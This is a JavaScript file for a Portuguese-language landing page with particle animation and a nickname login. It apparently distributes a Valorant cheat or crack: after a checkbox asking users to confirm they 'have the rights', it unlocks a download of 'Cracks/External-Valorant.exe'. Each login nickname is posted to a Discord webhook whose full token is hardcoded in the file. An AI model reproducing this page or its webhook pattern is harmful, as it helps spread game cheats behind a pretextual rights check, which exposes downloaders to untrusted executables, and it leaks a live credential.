/* Interactive Black AMOLED UI — download restored with confirmation + webhook send on login */

// Configure webhook (you gave this URL)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1428889692224491541/NRBk5LaiMNAL3U3ZloNF7jUDIhXJOEwXPD4Xg0bqyFb4nxiInqE3Ahi7j2rqI6JRSUzT";

// DOM refs
const bgCanvas = document.getElementById('bgCanvas');
const loginScreen = document.getElementById('loginScreen');
const mainMenu = document.getElementById('mainMenu');
const nickInput = document.getElementById('nickInput');
const enterBtn = document.getElementById('enterBtn');
const guestBtn = document.getElementById('guestBtn');
const userTag = document.getElementById('userTag');

const openDemo = document.getElementById('openDemo');
const demoModal = document.getElementById('demoModal');
const closeDemo = document.getElementById('closeDemo');
const confirmCheck = document.getElementById('confirmCheck');
const downloadLink = document.getElementById('downloadLink');

// --- basic canvas particles (same as before, compact) ---
const ctx = bgCanvas.getContext('2d');
let DPR = Math.max(1, window.devicePixelRatio || 1);
let W = 0, H = 0, particles = [];
function resizeCanvas(){ DPR = Math.max(1, window.devicePixelRatio || 1); W = innerWidth; H = innerHeight; bgCanvas.width = W*DPR; bgCanvas.height = H*DPR; bgCanvas.style.width = W + 'px'; bgCanvas.style.height = H + 'px'; ctx.setTransform(DPR,0,0,DPR,0,0); }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();
function rand(a,b){return Math.random()*(b-a)+a;}
function makeParticles(n){particles = []; for(let i=0;i<n;i++){particles.push({x:rand(0,W),y:rand(0,H),vx:rand(-0.15,0.15),vy:rand(-0.05,0.05),r:rand(0.6,2.4),alpha:rand(0.06,0.28)});} }
makeParticles(Math.round((W*H)/80000));
let last = performance.now();
function update(dt){particles.forEach(p=>{p.x += p.vx * dt; p.y += p.vy * dt; if(p.x < -20) p.x = W + 20; if(p.x > W + 20) p.x = -20; if(p.y < -20) p.y = H + 20; if(p.y > H + 20) p.y = -20;});}
function render(){
  ctx.clearRect(0,0,W,H);
  ctx.fillStyle = "#000"; ctx.fillRect(0,0,W,H);
  particles.forEach(p=>{
    ctx.beginPath();
    const glow = ctx.createRadialGradient(p.x,p.y,0,p.x,p.y, p.r*12);
    glow.addColorStop(0, `rgba(0,255,136,${p.alpha*0.9})`);
    glow.addColorStop(0.3, `rgba(0,209,255,${p.alpha*0.42})`);
    glow.addColorStop(1, `rgba(0,255,136,0)`);
    ctx.fillStyle = glow; ctx.arc(p.x, p.y, p.r*8, 0, Math.PI*2); ctx.fill();
    ctx.beginPath(); ctx.fillStyle = `rgba(180,255,200,${p.alpha})`; ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); ctx.fill();
  });
}
function tick(now){ const dt = Math.min(40, now - last); last = now; update(dt/16); render(); requestAnimationFrame(tick); }
requestAnimationFrame(tick);

/* parallax on mouse */
let pointer = {x:W/2,y:H/2};
window.addEventListener('mousemove', e=>{
  pointer.x = e.clientX; pointer.y = e.clientY;
  particles.forEach((p, idx)=>{ const dx = (pointer.x - p.x) * (0.0006 + (idx%3)*0.0001); const dy = (pointer.y - p.y) * (0.00035 + (idx%5)*0.00006); p.vx += dx; p.vy += dy; p.vx *= 0.995; p.vy *= 0.995; });
});

/* --- UI logic: stepwise login -> main --- */
function sanitizeNick(n){ if(!n) return ''; return n.replace(/<[^>]*>/g,'').replace(/[\n\r]/g,' ').slice(0,20); }
function showMain(nick){
  loginScreen.classList.add('hidden');
  const clean = sanitizeNick(nick) || 'Convidado';
  userTag.textContent = clean;
  setTimeout(()=> mainMenu.classList.remove('hidden'), 220);
  if(WEBHOOK_URL && WEBHOOK_URL.length > 6) sendWebhook(clean).catch(()=>{});
}
enterBtn.addEventListener('click', ()=>{ const nick = nickInput.value.trim(); if(!nick){ nickInput.classList.add('shake'); setTimeout(()=>nickInput.classList.remove('shake'),520); return; } showMain(nick); });
guestBtn.addEventListener('click', ()=> showMain('Convidado'));

/* modal + download confirmation logic */
openDemo.addEventListener('click', ()=> demoModal.classList.remove('hidden'));
closeDemo.addEventListener('click', ()=> demoModal.classList.add('hidden'));

// Initially disable download link; set real href but keep disabled UI until confirmed
(function initDownload(){
  const filePath = 'Cracks/External-Valorant.exe'; // local path relative to site root
  downloadLink.dataset.file = filePath;
  downloadLink.classList.add('disabled');
  downloadLink.setAttribute('aria-disabled','true');
  downloadLink.href = '#';
})();

confirmCheck.addEventListener('change', (e)=>{
  if(e.target.checked){
    // activate the link
    const file = downloadLink.dataset.file;
    downloadLink.href = file;
    downloadLink.setAttribute('download','');
    downloadLink.classList.remove('disabled');
    downloadLink.removeAttribute('aria-disabled');
  } else {
    // deactivate
    downloadLink.href = '#';
    downloadLink.classList.add('disabled');
    downloadLink.setAttribute('aria-disabled','true');
  }
});

// small safety: intercept click and show notice if not enabled
downloadLink.addEventListener('click', (ev)=>{
  if(downloadLink.classList.contains('disabled')){
    ev.preventDefault();
    alert('Você precisa confirmar que tem os direitos para baixar esse arquivo antes de prosseguir.');
  }
});

/* webhook sender with mild client-side rate limiting */
let lastWebhook = 0;
function sendWebhook(nick){
  const now = Date.now();
  if(now - lastWebhook < 6000) return Promise.resolve();
  lastWebhook = now;
  const body = { content: `🔐 LOGIN: **${nick}** entrou no painel (Demo)` };
  return fetch(WEBHOOK_URL, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(body) });
}
